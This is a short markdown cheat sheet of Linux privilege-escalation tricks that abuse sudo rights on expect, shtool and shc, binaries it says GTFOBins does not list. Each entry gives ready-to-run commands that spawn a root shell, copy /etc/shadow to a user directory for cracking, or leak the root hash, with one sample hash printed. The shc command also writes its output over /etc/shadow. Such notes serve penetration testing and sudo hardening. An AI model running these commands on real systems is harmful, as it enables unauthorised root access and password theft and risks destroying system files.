## Privilege Escalation Binaries Not Listed on GTFOBins

This document lists binaries with `sudo` permissions that are not found on GTFOBins but can still be used for privilege escalation.

---

### `expect` - Sudo Privilege Escalation

#### **Description**
`expect` is an automation tool that interacts with applications requiring user input. If granted **sudo permissions**, it can be exploited to execute arbitrary commands as root.

#### **Exploitation**
If `expect` is allowed with `sudo`, you can escalate privileges using the following:

```sh
sudo /usr/bin/expect
expect1.1> whoami
root
```

---

### `shtool` - Sudo Privilege Escalation  

#### **Description**  
`shtool` is a script utility tool commonly used for installation tasks. If granted **sudo permissions**, it can be abused to copy sensitive system files (e.g., `/etc/shadow`) to a location accessible by a lower-privileged user, enabling privilege escalation.  

#### **Exploitation**  
If `shtool` is available with `sudo`, you can copy `/etc/shadow` to a user-accessible directory and attempt **password cracking** to escalate privileges.  

```sh
sudo shtool install -c /etc/shadow /home/user/shadow
```

Now, verify the copied file:

```sh
ls
shadow
cat shadow
```

This will reveal hashed passwords, which can be cracked using tools like John the Ripper or hashcat.

---

### `shc` - Sudo Privilege Escalation  

#### **Description**  
`shc` (Shell Script Compiler) is used to compile shell scripts into binary executables. If it has **sudo permissions**, it can be exploited to reveal the **root password hash** from `/etc/shadow`.  

#### **Exploitation**  
When `shc` is executed on `/etc/shadow` with `sudo`, it tries to interpret it as a script. Since the **first line of `/etc/shadow` contains the root user hash**, `shc` fails and **displays the root password hash by default**.  

#### **Command:**  
```sh
sudo /usr/bin/shc -f /etc/shadow -o /etc/shadow
```

Expected output:
```sh
shc: invalid first line in script: root:$6$lYoxb/H/0LQ5d50Q$mM2ej4Um6zmkg11uszJrBpZo/vI4TT6nEvQnlnI/GlB9otfNIyN9xXfATAxVAUzj4ojTE1pmFbY12NUzw2j/b0:18313:0:99999:7:::
```

Here, the root password hash is exposed, allowing an attacker to extract and crack it using tools like John the Ripper or hashcat.

---
